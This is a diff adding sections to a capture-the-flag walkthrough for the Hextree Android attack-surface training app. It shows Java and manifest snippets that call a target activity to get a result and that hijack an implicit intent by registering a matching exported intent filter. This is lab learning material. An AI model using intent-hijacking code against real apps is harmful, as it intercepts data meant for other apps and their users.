@@ -200,9 +200,86 @@ public void onClick(View v){
 Applications often use intents to reach out and trigger activities within other applications - often times there is a need for two-way communication to get the result of an activity being performed on another app.
 #### 8 - Do you expect a result?
 
+Meeting these conditions is as simple as changing the name of our `MainActivity` to `MainHextreeActivity` and calling the `Flag8Activity` while being prepared to handle the activity result:
 
+### 9 - Receive result with flag
 
+This activity will send us the flag in the intent that it will send back - so we can re-use the Flag8Activity code which fulfills the conditions while changing the target intent:
+```java
+public void onCreate(Bundle bundle) {
+        ...
+        if (callingActivity == null || !callingActivity.getClassName().contains("Hextree")) {
+            return;
+        }
+        Intent intent = new Intent("flag");
+        ...
+        success(this);
+    }
+```
 
+So our code still has the name containing `Hextree` and we use a request code of `42` which satisfies the conditions. Then the target activity sends an intent to our app and we can see it in the `Utils.showDialog` window:
+
+```java
+public class MainHextreeActivity extends AppCompatActivity {  
+    @Override  
+    protected void onCreate(Bundle savedInstanceState) {  
+	....
+			 public void onClick(View v){  
+                Intent intent = new Intent();  
+                intent.setComponent(new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag8Activity"));  
+                startActivityForResult(intent, 42);  
+            }  
+  
+	@Override  
+    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent intent){  
+        super.onActivityResult(requestCode, resultCode, intent);  
+        Utils.showDialog(this, intent);  
+    }
+```
+
+# Implicit Intent Hijacking 
+### 10 - Hijacking Implicit intents 
+
+> **Exported = "false"**
+
+the flag10activity code is given below.
+```java
+		    ...
+            Toast.makeText(this, "Sending implicit intent with the flag\nio.hextree.attacksurface.ATTACK_ME", 1).show();
+            Intent intent = new Intent("io.hextree.attacksurface.ATTACK_ME");
+            intent.addFlags(8);
+            this.f.addTag(intent);
+            intent.putExtra("flag", this.f.appendLog(this.flag));
+            try {
+                startActivity(intent);  //this is why our second activity code is empty 
+                success(this);
+            } ...
+```
+This is will check every app on the device that can handle that intent action, we will declare that intent action in out intent filter thereby forcing apps to use our app. 
+
+So it seems like as long as we declare an activity to work with the specified intent filter it should work. We can modify our manifest and `SecondActivity.java` as follows:
+
+```xml
+<activity  
+    android:name=".SecondActivity"  
+    android:exported="true">  
+    <intent-filter>        
+	    <action android:name="io.hextree.attacksurface.ATTACK_ME"/>  
+        <category android:name="android.intent.category.DEFAULT"/>  
+    </intent-filter>
+</activity>
+```
+
+```java
+public class SecondActivity extends AppCompatActivity {
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+    }
+}
+```
+
+As you can see, my second activity doesn’t do anything because it doesn’t have to. Flag 10 only needs to be able to find an activity capable of handling the intent - then it will reveal the flag.
+### 11
 ## References
 https://www.youtube.com/watch?v=jnBmI1eD-og
 https://itsfading.github.io/posts/HexTree-Attack-Surface-App-Solutions/
